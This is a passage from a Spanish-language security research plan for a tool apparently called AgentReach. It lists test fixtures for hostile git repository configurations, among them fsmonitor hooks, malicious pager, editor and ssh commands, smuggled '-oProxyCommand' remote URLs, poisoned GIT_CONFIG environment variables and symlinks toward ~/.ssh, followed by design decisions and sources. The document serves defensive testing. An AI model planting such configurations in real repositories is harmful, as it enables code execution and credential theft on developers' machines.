5. `alias-bang`, `pager-malo`, `sshcommand-malo`, `editor-malo`, `askpass-malo`, `credential-helper-bang`. G4.
6. `externo-diff`: `diff.external`; `textconv` con `.gitattributes`; `filter.smudge`; `merge.driver`. G5/G6, incluido el caso `filter=lfs` legítimo que debe quedar como Baja.
7. `gpg-program`: `log.showSignature=true` + `gpg.program` señuelo. **Prueba para verificar mi hipótesis** (sección 2) sobre `git log`; sirve también para decidir si `log` es aceptable.
8. `remoto-con-token`: URL con `usuario:token@`, con token falso. G7; comprobar que el informe lo enmascara.
9. `remoto-ext`, `remoto-guion` (`-oProxyCommand=...`), `remoto-con-CR`. G8.
10. `submodulo-CR-symlink`: `.gitmodules` con ruta terminada en `\r` y symlink hacia `.git/modules/x/hooks`. G9 (sin hacer `submodule update`).
11. `bare-enterrado`: subcarpeta con `HEAD`, `objects/`, `refs/`, `config` con fsmonitor. G10; y variante sin claves peligrosas (Baja).
12. `git-archivo`: `.git` es un archivo con `gitdir:` hacia fuera. G11.
13. `include-escondido`: `[include] path` y `includeIf gitdir:` con el `fsmonitor` dentro del archivo incluido; incluir ciclo (A incluye B incluye A) y ruta inexistente. G12; debe no colgarse.
14. `config-trampa-de-formato`: claves en MAYÚSCULAS, secciones con subsecciones entre comillas, valores con `\` y continuación de línea, comentarios con `;` y `#`, `fsmonitor` tras un comentario falso. Verifica que el lector estático lee como git. Si discrepa: G18, nunca ejecutar.
15. `extensiones-promisor`: `extensions.partialClone` y `remote.origin.promisor=true`. G13.
16. `propiedad-dudosa`: carpeta de otro usuario (por ejemplo en `C:\Users\Public`). Git debe negarse; AgentReach debe informar y seguir. G14.
17. `entorno-envenenado`: ejecutar el propio AgentReach con `GIT_CONFIG_COUNT/KEY/VALUE` poniendo `core.fsmonitor` y con `GIT_EXTERNAL_DIFF`. Esperado: G15 y el envoltorio los elimina; sin marcador.
18. `windows-nombres`: nombres 8.3 (`GIT~1`), `.git ` con espacio final, flujos alternos NTFS (`.git::$INDEX_ALLOCATION`) como carpetas dentro de un repo. **Sin fuente verificada**: comprobar que AgentReach no confunde ni sigue esos caminos.
19. `symlink-fuera`: symlinks que salen del repo hacia `~/.ssh` (solo un archivo señuelo en una ruta de prueba, no el real) para comprobar que el recorrido no los sigue.
20. `repo-enorme-o-roto`: objetos corruptos, índice truncado; la ejecución con tiempo límite debe fallar cerrada.

## 8. Decisiones sugeridas para el proyecto

1. MVP: sin git sobre la carpeta analizada. Análisis estático del `.git/config` y archivos relacionados (G1-G14).
2. Documentar en el catálogo (oráculo) las explicaciones de G1-G18 en lenguaje llano, con el ejemplo.
3. Si se añade git en una fase posterior: envoltorio único con la receta 5.3, lista cerrada de órdenes y los casos 7 y 17 como pruebas obligatorias en la integración continua.
4. Revisar de nuevo esta investigación antes del lanzamiento: varias fuentes 2026 son secundarias y el panorama cambia rápido (GitSpawn es de septiembre de 2026).

## 9. Fuentes

Verificadas (abiertas y leídas):
- https://git-scm.com/docs/git-config (config, SCOPES/configuración protegida, safe.directory, safe.bareRepository, protocol.*, gpg.program, log.showSignature, packObjectsHook, core.*)
- https://git-scm.com/docs/git (variables de entorno)
- https://git-scm.com/docs/git-status (refresco del índice, `--no-optional-locks`, fsmonitor)
- https://git-scm.com/docs/gitattributes y https://git-scm.com/docs/githooks
- https://git-scm.com/docs/git-config/2.50.0 (GIT_CONFIG_COUNT/KEY/VALUE)
- https://raw.githubusercontent.com/git/git/master/Documentation/RelNotes/2.50.1.adoc, 2.43.7.adoc, 2.43.6.adoc, 2.45.1.adoc (notas de versión)
- https://github.blog/open-source/git/git-security-vulnerabilities-announced-3/ (feb 2023), -4/ (abr 2023), -5/ (ene 2025), -6/ (jul 2025)
- https://github.com/git-for-windows/git/security/advisories (avisos Git for Windows; títulos y fechas)
- https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md (2022)
- https://www.sonarsource.com/blog/securing-developer-tools-git-integrations
- https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-coding-agent-git-config-rce-20260904-cs/ (GitSpawn; es un resumen de un informe de Manifold Security: dato de segunda mano)

Verificadas el 2026-11-09 (segunda ronda; detalle en `verificacion-fuentes-seguridad.md`): Talos TALOS-2025-2243, la interfaz de programación de NVD (CVE-2025-41390, CVE-2024-32002, CVE-2025-48384), GHSA-vwqx-4fm8-6qc9, cada aviso de Git for Windows de 2026, y los archivos de documentación `gpg.adoc`, `log.adoc`, `core.adoc`, `extensions.adoc`, `alias.adoc`, `credential.adoc`, además de https://git-scm.com/docs/gitcredentials, https://git-scm.com/docs/githooks y https://git-scm.com/docs/gitrepository-layout.

Fuente secundaria o solo vista en resultados de búsqueda:
- https://safeguard.sh/resources/blog/git-security-2026-cve-trends-and-hardening-baseline (2026-10-23; el propio texto admite incoherencias)
- https://www.openwall.com/lists/oss-security/2025/07/08/4, https://www.bleepingcomputer.com/news/security/cisa-warns-of-actively-exploited-git-code-execution-flaw/, https://arcticwolf.com/resources/blog/poc-available-for-high-severity-arbitrary-file-write-in-git-cli-cve-2025-48384/ (CVE-2025-48384 y KEV)
- https://access.redhat.com/security/cve/CVE-2025-41390 (TruffleHog) y https://www.miggo.io/vulnerability-database/cve/CVE-2026-45033 (Copilot CLI)
- https://lore.kernel.org/git/xmqqfrxexx15.fsf@gitster.g/ (GIT_NO_LAZY_FETCH)
- Resultados de la lista de git y notas de 2.33.2 sobre CVE-2022-24765 (no abrí la página)

Todo el contenido web leído se trató como datos, no como instrucciones.
